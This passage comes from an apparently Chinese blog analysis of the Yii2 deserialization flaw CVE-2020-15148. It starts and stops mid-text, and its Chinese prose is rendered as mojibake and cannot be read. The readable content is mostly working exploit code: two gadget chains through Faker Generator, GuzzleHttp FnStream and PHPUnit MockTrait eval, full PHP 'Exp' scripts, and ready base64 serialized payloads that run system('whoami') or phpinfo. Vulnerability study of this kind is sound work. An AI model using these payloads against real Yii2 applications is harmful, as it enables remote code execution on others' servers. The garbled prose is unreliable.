punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_batch</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_value</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_key</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>__destruct</code>è°ƒç”¨äº†<code>reset</code>æ–¹æ³•<code>reset</code>è°ƒç”¨äº†<code>close</code>æ–¹æ³•ï¼Œå‚æ•°<code>_dataReader</code>å¯æ§ï¼Œå­¦ä¹ æ€è·¯åçŸ¥é“è¿™é‡Œå¯ä»¥é€šè¿‡è§¦å‘<code>__call</code>æ–¹æ³•æ¥è¿›è¡Œåˆ©ç”¨</p><ul><li><code>__call</code>ï¼šå½“ä¸€ä¸ªå¯¹è±¡åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ </li></ul><p>å½“ä¸€ä¸ªå¯¹è±¡è°ƒç”¨ä¸å¯è®¿é—®çš„<code>close</code>æ–¹æ³•æˆ–è€…ç±»ä¸­å‹æ ¹å°±æ²¡æœ‰<code>close</code>æ–¹æ³•ï¼Œå³å¯è§¦å‘<code>__call</code>ï¼Œå…¨å±€æœç´¢<code>__call</code>æ–¹æ³•</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511200257237.png" alt loading="lazy"></p><p>æ‰¾åˆ°å…¶ä¸­ä¸€ä¸ª<code>Faker/Generator.php</code>ç±»ï¼Œè·Ÿè¿›æŸ¥çœ‹ä»£ç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">format</span><span class="token punctuation">(</span><span class="token variable">$formatter</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getFormatter</span><span class="token punctuation">(</span><span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getFormatter</span><span class="token punctuation">(</span><span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token variable">$formatter</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token variable">$formatter</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">providers</span> <span class="token keyword">as</span> <span class="token variable">$provider</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$provider</span><span class="token punctuation">,</span> <span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token variable">$formatter</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$provider</span><span class="token punctuation">,</span> <span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token variable">$formatter</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>InvalidArgumentException</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unknown formatter "%s"'</span><span class="token punctuation">,</span> <span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>__call</code>æ–¹æ³•è°ƒç”¨äº†ç±»ä¸­çš„<code>format</code>æ–¹æ³•ï¼Œ<code>format</code>æ–¹æ³•é‡Œçš„<code>call_user_func_array</code>é‡Œçš„å‚æ•°è°ƒç”¨äº†<code>getFormatter</code>æ–¹æ³•</p><ul><li><p><code>call_user_func_array</code>ï¼šè°ƒç”¨å›è°ƒå‡½æ•°ï¼Œå¹¶æŠŠä¸€ä¸ªæ•°ç»„å‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°</p><p>å¤§è‡´ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">foobar</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token constant">__FUNCTION__</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">" got <span class="token interpolation"><span class="token variable">$arg</span></span> and <span class="token interpolation"><span class="token variable">$arg2</span></span>\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">foo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">bar</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token constant">__METHOD__</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">" got <span class="token interpolation"><span class="token variable">$arg</span></span> and <span class="token interpolation"><span class="token variable">$arg2</span></span>\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// Call the foobar() function with 2 arguments</span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"foobar"</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"one"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"two"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Call the $foo->bar() method with 2 arguments</span><span class="token variable">$foo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo</span><span class="token punctuation">;</span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$foo</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"bar"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"three"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"four"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></li></ul><p><code>getFormatter</code>æ–¹æ³•ä»<code>$this-&gt;$formatter</code>ä¸­å–å€¼ï¼Œ<code>$this-&gt;formatter</code>å¯æ§ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥è°ƒç”¨ä»»æ„ç±»ä¸­çš„ä»»æ„æ–¹æ³•äº†ã€‚Debugå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511203202841.png" alt loading="lazy"></p><p>ä½†æ˜¯<code>$arguments</code>æ˜¯ä»<code>yii\db\BatchQueryResult::reset()</code>é‡Œä¼ è¿‡æ¥çš„ï¼Œæˆ‘ä»¬ä¸å¯æ§ï¼Œæ¯”å¦‚è¿™é‡Œå°±ä¸ºç©ºï¼Œå› ä¸ºä¼ æ¥çš„<code>close</code>æ–¹æ³•ä¸­å‚å‚æ•°å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½ä¸å¸¦å‚æ•°åœ°å»è°ƒç”¨åˆ«çš„ç±»ä¸­çš„æ–¹æ³•ã€‚</p><p>åˆ°è¿™ä¸€æ­¥å°±éœ€è¦ä¸€ä¸ªæ‰§è¡Œç±»ï¼Œè¿™æ—¶éœ€è¦ç±»ä¸­çš„æ–¹æ³•éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶</p><ol><li>æ–¹æ³•æ‰€éœ€çš„å‚æ•°åªèƒ½æ˜¯å…¶è‡ªå·±ç±»ä¸­å­˜åœ¨çš„ï¼ˆå³å‚æ•°ï¼š<code>$this-&gt;args</code>ï¼‰</li><li>æ–¹æ³•éœ€è¦æœ‰å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½</li></ol><p>é€šè¿‡å…¨å±€æŸ¥æ‰¾æ­£åˆ™åŒ¹é…<code>call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</code>æ¥æŸ¥æ‰¾ï¼Œç»“æœå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511203624162.png" alt loading="lazy"></p><ul><li><p><code>call_user_func</code>ï¼šæŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨,è¿™é‡Œç”¨<code>call_user_func</code>å³å¯è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœä¹Ÿå¯ä»¥è¾¾åˆ°<code>RCE</code>çš„æ•ˆæœ</p><p>å¤§è‡´ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">increment</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$var</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'increment'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'increment'</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// You can use this instead before PHP 5.3</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></li></ul><p>å…¶ä¸­æœ‰ä¸¤ä¸ªç±»ä¸­çš„<code>run</code>æ–¹æ³•å¯ç”¨</p><ol><li><p><code>yii\rest\CreateAction::run()</code>ï¼Œ<code>$this-&gt;checkAccess, $this-&gt;id</code>ä¸¤ä¸ªå‚æ•°å¯æ§</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token operator">...</span><span class="token operator">...</span>        <span class="token keyword">return</span> <span class="token variable">$model</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>\yii\rest\IndexAction::run()</code>ï¼Œ<code>$this-&gt;checkAccess, $this-&gt;id</code>ä¸¤ä¸ªå‚æ•°å¯æ§</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">prepareDataProvider</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><p>äºæ˜¯å³å¯æ„é€ å®Œæ•´çš„<code>pop</code>é“¾</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token operator">::</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token class-name class-name-fully-qualified static-context">Faker<span class="token punctuation">\</span>Generator</span><span class="token operator">::</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token operator">::</span><span class="token constant">run</span><span class="token operator">-></span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Exp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">;</span>           <span class="token comment">//command</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'close'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">IndexAction</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo2OiJzeXN0ZW0iO3M6MjoiaWQiO3M6Njoid2hvYW1pIjt9aToxO3M6MzoicnVuIjt9fX19</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>å‘½ä»¤æ‰§è¡Œç»“æœå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511204922226.png" alt loading="lazy"></p><h4 id="POP2"><a href="#POP2" class="headerlink" title="POP2"></a>POP2</h4><p>è¿˜æ˜¯ä»<code>yii2/db/BatchQueryResult.php</code>å…¥æ‰‹ï¼Œæ¢ç§æ€è·¯ï¼Œæˆ‘ä»¬ä¸æ‰¾<code>__call</code>æ–¹æ³•æ¥è§¦å‘ï¼Œç›´æ¥æ‰¾<code>close</code>æ–¹æ³•</p><p>éšåæˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ª<code>FnStream.php</code>åœ¨<code>vendor\guzzlehttp\psr7\src</code>ç›®å½•ä¸‹ï¼Œä»£ç å¦‚ä¸‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_fn_close</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>$this-&gt;_fn_close</code>å¯æ§</p><p>Exp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">FnStream</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> <span class="token variable">$_fn_close</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7<span class="token punctuation">\</span>FnStream</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span>  <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FnStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BatchQueryResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoyNDoiR3V6emxlSHR0cFxQc3I3XEZuU3RyZWFtIjoxOntzOjk6Il9mbl9jbG9zZSI7czo3OiJwaHBpbmZvIjt9fQ==</span><span class="token punctuation">&#125;</span></span></code></pre><p>æ‰§è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210513172934351.png" alt loading="lazy"></p><p>æˆ‘ä»¬éœ€è¦å¯¹å±å®³è¿›è¡Œæ”¾å¤§ï¼Œè¿™é‡Œå°±éœ€è¦ä¸€ä¸ªæ‰§è¡Œç±»ï¼Œæ‹¿è¿™ä¸ª<code>call_user_func</code>å‡½æ•°ä½œè·³æ¿ï¼Œæ¥è¿›è¡Œä»£ç æ‰§è¡Œï¼Œå…¨å±€æœç´¢evalï¼Œæ‰¾åˆ°ä¸€ä¸ª<code>MockTrait.php</code>æ–‡ä»¶åœ¨<code>vendor\phpunit\phpunit\src\Framework\MockObject</code>ä¸‹ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function"><span class="token punctuation">\</span>class_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mockName</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">classCode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mockName</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>$this-&gt;classCode</code>å’Œ<code>$this-&gt;mockName</code>éƒ½å¯æ§</p><p>äºæ˜¯å³å¯æ„é€ å®Œæ•´çš„<code>pop</code>é“¾</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token operator">::</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token class-name class-name-fully-qualified static-context">GuzzleHttp<span class="token punctuation">\</span>Psr7<span class="token punctuation">\</span>FnStream</span><span class="token operator">::</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token property">call_user_func</span><span class="token operator">-></span><span class="token class-name class-name-fully-qualified static-context">PHPUnit<span class="token punctuation">\</span>Framework<span class="token punctuation">\</span>MockObject<span class="token punctuation">\</span>MockTrait</span><span class="token operator">::</span><span class="token constant">generate</span><span class="token operator">-></span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Exp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">PHPUnit<span class="token punctuation">\</span>Framework<span class="token punctuation">\</span>MockObject</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">MockTrait</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$classCode</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system('whoami');"</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$mockName</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"extrader"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">PHPUnit<span class="token punctuation">\</span>Framework<span class="token punctuation">\</span>MockObject<span class="token 